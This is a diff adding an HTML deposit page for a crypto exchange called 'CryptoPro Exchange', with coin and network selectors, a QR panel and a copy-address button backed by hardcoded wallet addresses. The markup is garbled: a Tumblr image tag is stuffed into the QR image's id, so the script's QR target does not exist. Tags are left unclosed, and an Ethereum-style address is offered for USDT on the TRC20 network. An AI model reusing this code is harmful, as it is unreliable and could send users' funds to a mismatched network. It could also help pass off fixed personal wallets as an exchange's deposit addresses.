@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Deposit | CryptoPro Exchange</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+
+<style>
+
+
+
+
+/* ================= NAVBAR ================= */
+nav{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:20px 8%;
+  background:#fff;
+  position:fixed;
+  width:100%;
+  top:0;
+  box-shadow:0 2px 15px rgba(0,0,0,0.05);
+  z-index:1000;
+} 
+
+.logo{
+  font-size:22px;
+  font-weight:700;
+  color:#007BFF;
+}
+
+/* Menu */
+nav ul{
+  list-style:none;
+  display:flex;
+  gap:30px;
+  align-items:center;
+}
+
+nav ul li{
+  position:relative;
+}
+
+nav ul li a{
+  text-decoration:none;
+  color:#333;
+  font-weight:500;
+  transition:.3s;
+  padding:8px 0;
+}
+
+nav ul li a:hover{
+  color:#007BFF;
+}
+
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
+body{background:#0b0e11;color:#fff;display:flex;min-height:100vh;}
+
+.sidebar{
+width:230px;
+background:#11161c;
+padding:20px;
+position:fixed;
+height:100%;
+}
+
+.sidebar h2{
+color:#f0b90b;
+margin-bottom:30px;
+}
+
+.sidebar ul{list-style:none;}
+.sidebar ul li{
+margin:15px 0;
+cursor:pointer;
+color:#aaa;
+}
+.sidebar ul li:hover{color:#f0b90b;}
+
+.main{
+margin-left:230px;
+padding:30px;
+width:100%;
+}
+
+.header{
+
+
+margin-bottom:30px;
+}
+
+.card{
+background:#1e2329;
+padding:25px;
+border-radius:10px;
+margin-bottom:25px;
+}
+
+.card h3{
+margin-bottom:15px;
+font-weight:500;
+}
+
+input,select{
+width:100%;
+padding:10px;
+margin-bottom:15px;
+border-radius:6px;
+border:none;
+background:#2b3139;
+color:white;
+}
+
+.deposit-box{
+display:flex;
+gap:20px;
+flex-wrap:wrap;
+}
+
+.qr-box{
+flex:1;
+min-width:250px;
+text-align:center;
+}
+
+.qr-box img{
+width:200px;
+margin-bottom:10px;
+}
+
+.address-box{
+flex:2;
+min-width:250px;
+}
+
+.copy-btn{
+background:#f0b90b;
+border:none;
+padding:8px 12px;
+cursor:pointer;
+border-radius:5px;
+margin-top:5px;
+}
+
+.instructions{
+font-size:13px;
+color:#bbb;
+margin-top:10px;
+}
+
+
+.status{
+color:#f0b90b;
+}
+
+@media(max-width:768px){
+.sidebar{display:none;}
+.main{margin-left:0;}
+.deposit-box{flex-direction:column;}
+}
+</style>
+</head>
+
+<body>
+
+
+<nav class="navbar">
+ 
+    <ul>
+        <li style="color: black ;">
+            
+            <a href="profile.html">◀️</a>Back</li>
+        <li>
+    </ul>
+</nav>
+
+<br> <br
+<br> <br>
+  
+
+<div class="main">
+    
+<br> <br>
+
+<div class="header">
+<h1>Deposit Crypto</h1>
+</div>
+
+<div class="card">
+<h3>Select Coin & Network</h3>
+
+<select id="coin">
+<option value="Bitcoin">Bitcoin (BTC)</option>
+<option value="Ethereum">Ethereum (ETH)</option>
+<option value="USDT">USDT (TRC20)</option>
+</select>
+
+<select id="network">
+<option value="BTC Network">BTC Network</option>
+<option value="ERC20">ERC20</option>
+<option value="TRC20">TRC20</option>
+</select>
+</div>
+
+<div class="card deposit-box">
+
+<div class="qr-box">
+<img id="<img decoding="sync" loading="lazy" sizes="586px" srcset="https://64.media.tumblr.com/7479b383bbe842ee2d44f3a5aaf67e50/71eebc309c42d214-ee/s100x200/68a50267f32ea35897158f78ca1af7b8786ddfae.jpg 100w, https://64.media.tumblr.com/7479b383bbe842ee2d44f3a5aaf67e50/71eebc309c42d214-ee/s250x400/e6591a0330429f36e552eee1b2cb3e17d5f85689.jpg 250w, https://64.media.tumblr.com/7479b383bbe842ee2d44f3a5aaf67e50/71eebc309c42d214-ee/s400x600/70eb85ee8a10c9bd7f7343f8110d08b7132eb9b3.jpg 400w, https://64.media.tumblr.com/7479b383bbe842ee2d44f3a5aaf67e50/71eebc309c42d214-ee/s500x750/dc7770660659119e8e529feab5034f973b2b6f49.jpg 500w, https://64.media.tumblr.com/7479b383bbe842ee2d44f3a5aaf67e50/71eebc309c42d214-ee/s540x810/9563ac3cf1d3b7b48ae205663270d7c7b188685c.jpg 540w, https://64.media.tumblr.com/7479b383bbe842ee2d44f3a5aaf67e50/71eebc309c42d214-ee/s640x960/8cae97ad30f0043e415a7b7997c219a449ea61d5.jpg 586w"">
+<p>Scan QR Code</p>
+</div>
+
+<div class="address-box">
+<h3>Deposit Address</h3>
+<input type="text" id="walletAddress" readonly>
+<button class="copy-btn" onclick="copyAddress()">Copy Address</button>
+
+<div class="instructions">
+• Send only the selected coin to this address.<br>
+• Network must match or funds may be lost.<br>
+• Minimum deposit: 0.0001 BTC equivalent.
+</div>
+</div>
+
+</div>
+
+
+
+<script>
+
+const walletAddresses = {
+Bitcoin: "1JopUcUYRvPhWQDiwcTJcG5YwoVWiLAwuD",
+Ethereum: "0x448c2747e8c4305e20b2055568135e1a27a810ce",
+USDT: "0x448c2747e8c4305e20b2055568135e1a27a810ce"
+};
+
+function generateDeposit(){
+let coin = document.getElementById("coin").value;
+let address = walletAddresses[coin];
+document.getElementById("walletAddress").value = address;
+
+QRCode.toDataURL(address).then(url=>{
+document.getElementById("qrCode").src = url;
+});
+}
+
+function copyAddress(){
+let input = document.getElementById("walletAddress");
+navigator.clipboard.writeText(input.value);
+alert("Address copied successfully!");
+}
+
+document.getElementById("coin").addEventListener("change",generateDeposit);
+generateDeposit();
+
+</script>
+
+</body>
+</html>
